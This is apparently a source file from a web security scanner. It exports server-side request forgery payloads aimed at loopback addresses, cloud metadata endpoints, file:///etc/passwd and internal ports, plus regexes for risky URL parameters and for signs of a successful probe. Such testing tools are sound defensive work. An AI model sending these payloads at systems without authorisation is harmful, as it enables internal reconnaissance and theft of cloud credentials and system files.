export const SSRF_PAYLOADS = [
  'http://127.0.0.1',
  'http://localhost',
  'http://[::1]',
  'http://0.0.0.0',
  'http://169.254.169.254/latest/meta-data/',   // AWS metadata
  'http://metadata.google.internal/',            // GCP metadata
  'http://100.100.100.200/latest/meta-data/',    // Alibaba metadata
  'file:///etc/passwd',
  'http://127.0.0.1:22',                        // port scan
  'http://127.0.0.1:3000',                      // internal services
];

export const SSRF_PARAM_PATTERNS = /[?&](url|link|src|image|proxy|callback|fetch|load|uri|href|path|file|resource|target|site|page|data)=/i;

export const SSRF_INDICATORS = [
  /root:.*:0:0/,                  // /etc/passwd content
  /ami-id/i,                      // AWS metadata
  /instance-id/i,                 // Cloud metadata
  /meta-data/i,                   // Generic metadata
  /Connection refused/i,          // Internal port scan evidence
  /ECONNREFUSED/,                 // Node.js connection refused
  /No route to host/i,
  /EHOSTUNREACH/,                 // Node.js host unreachable
  /Could not fetch.*127\.0\.0\.1/i,  // Server-side fetch error for loopback
  /Could not fetch.*localhost/i,     // Server-side fetch error for localhost
  /Could not fetch.*\[::1\]/i,      // Server-side fetch error for IPv6 loopback
];
